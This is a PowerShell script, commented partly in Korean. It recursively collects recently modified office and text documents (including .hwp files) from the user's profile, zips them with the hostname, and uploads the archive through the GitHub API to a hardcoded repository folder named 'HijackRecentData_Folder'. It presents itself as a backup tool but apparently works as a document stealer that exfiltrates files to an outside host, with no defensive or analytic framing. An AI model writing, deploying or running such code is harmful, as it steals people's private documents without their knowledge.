param(
    [string]$GitHubToken,
    [int]$MaxTotalMB = 50,
    [int]$MaxPerFileMB = 10,
    [int]$Days = 7
)

# ---------- Configuration ----------
$Extensions     = @('ppt','pptx','xlsx','hwp','txt')
$RepoOwner      = '1-3-1'
$RepoName       = '25HOTEL'
$RepoPath       = 'HijackRecentData_Folder'
$Branch         = 'main'
$CommitterName  = 'AutoBackupScript'
$CommitterEmail = 'noreply@example.com'

# ---------- Internal ----------
function DebugCheckpoint {
    param([string]$label)
    Write-Host "[DEBUG] Checkpoint: $label"
}

if ([string]::IsNullOrWhiteSpace($GitHubToken)) {
    Write-Host "Warning: GitHub token is not set. Please provide it using -GitHubToken"
    throw "GitHub token not provided. Set -GitHubToken before running the script."
}

$hostname = $env:COMPUTERNAME
if ([string]::IsNullOrEmpty($hostname)) { $hostname = ([System.Net.Dns]::GetHostName()) }
$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$zipName = "{0}_RECENT_{1}.zip" -f $hostname, $timestamp
$tempZipPath = Join-Path -Path $env:TEMP -ChildPath $zipName

Write-Host "Script started. Host: $hostname, Zip: $tempZipPath"
DebugCheckpoint "After initialization"

# 2단계: 최근 N일 내 특정 확장자 파일 찾기
$searchRoot = $env:USERPROFILE
$cutoff = (Get-Date).AddDays(-1 * $Days)

Write-Host "[INFO] Scanning directory: $searchRoot"
Write-Host "[INFO] Cutoff date: $cutoff"
Write-Host "[INFO] Extensions: $($Extensions -join ', ')"
Write-Host "[INFO] Max file size: $MaxPerFileMB MB"

$allFiles = Get-ChildItem -Path $searchRoot -Recurse -File -ErrorAction SilentlyContinue |
    Where-Object {
        $ext = $_.Extension.TrimStart('.').ToLower()
        ($Extensions -contains $ext) -and
        ($_.LastWriteTime -ge $cutoff) -and
        ($_.Length -le ($MaxPerFileMB * 1MB))
    } |
    Sort-Object LastWriteTime -Descending

Write-Host "[INFO] Found $($allFiles.Count) candidate files.`n"

$allFiles | ForEach-Object {
    Write-Host ("[CANDIDATE] {0} ({1} KB) - {2}" -f $_.FullName, [math]::Round($_.Length / 1KB, 2), $_.LastWriteTime)
}

Write-Host "[INFO] ✅ Finished step 2 - file scan complete."
DebugCheckpoint "After file scan"

# 3단계: 크기 제한 내에서 파일 선택
$selected = @()
$runningBytes = 0
$maxTotalBytes = $MaxTotalMB * 1MB

foreach ($f in $allFiles) {
    if ($runningBytes + $f.Length -le $maxTotalBytes) {
        $selected += $f.FullName
        $runningBytes += $f.Length
        Write-Host ("[SELECTED] {0} ({1} KB) - Running total: {2} KB" -f $f.FullName, [math]::Round($f.Length/1KB,2), [math]::Round($runningBytes/1KB,2))
    } else {
        Write-Host ("[SKIPPED]  {0} ({1} KB) - Would exceed limit ({2} KB)" -f $f.FullName, [math]::Round($f.Length/1KB,2), [math]::Round($runningBytes/1KB,2))
    }
}

if ($selected.Count -eq 0) {
    Write-Host "[INFO] ❌ No files selected for compression. Exiting script."
    return
}

DebugCheckpoint "After file selection"

# 압축 실행
if (Test-Path $tempZipPath) {
    Remove-Item $tempZipPath -Force -ErrorAction SilentlyContinue
}

Write-Host "[INFO] Compressing $($selected.Count) files into $tempZipPath..."
Compress-Archive -Path $selected -DestinationPath $tempZipPath -Force

if (-not (Test-Path $tempZipPath)) {
    throw "Compression failed: $tempZipPath was not created."
}

$zipSizeMB = [math]::Round((Get-Item $tempZipPath).Length / 1MB, 2)
Write-Host "[INFO] ✅ Compression complete: $tempZipPath ($zipSizeMB MB)"
DebugCheckpoint "After compression"

# 4단계: GitHub 업로드
$owner = $RepoOwner
$repo  = $RepoName
$pathInRepo = ($RepoPath.Trim('/')) + "/" + $zipName
$url = "https://api.github.com/repos/$owner/$repo/contents/$pathInRepo"
$b64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($tempZipPath))

$body = @{
    message = "Upload recent backup: $zipName"
    branch  = $Branch
    committer = @{
        name  = $CommitterName
        email = $CommitterEmail
    }
    content = $b64
}

$headers = @{
    Authorization = "token $GitHubToken"
    Accept        = "application/vnd.github.v3+json"
    'User-Agent'  = 'PowerShell-BackupScript'
}

$jsonBody = $body | ConvertTo-Json -Depth 6

Write-Host "[INFO] Uploading to GitHub repo: $repo (branch: $Branch)"
Write-Host "[INFO] API URL: $url"

try {
    $response = Invoke-RestMethod -Uri $url -Method Put -Headers $headers -Body $jsonBody -ContentType "application/json" -ErrorAction Stop

    if ($response.content -ne $null -and $response.content.name -ne $null) {
        Write-Host "[SUCCESS] ✅ Upload successful! File: $($response.content.path)"
        
        try {
            Remove-Item -Path $tempZipPath -Force -ErrorAction Stop
            Write-Host "[INFO] Temp zip deleted: $tempZipPath"
        } catch {
            Write-Host "[WARN] ⚠️  Failed to delete zip: $($_.Exception.Message)"
        }
    } else {
        Write-Host "[ERROR] ❌ Upload response incomplete or unexpected."
    }
}
catch {
    Write-Host "[ERROR] ❌ Upload failed: $($_.Exception.Message)"
    if ($_.Exception.Response -ne $null) {
        try {
            $respBody = $_.Exception.Response.Content | ConvertFrom-Json
            Write-Host "[GitHub API Error] $($respBody.message)"
        } catch {}
    }
}

DebugCheckpoint "After GitHub upload"
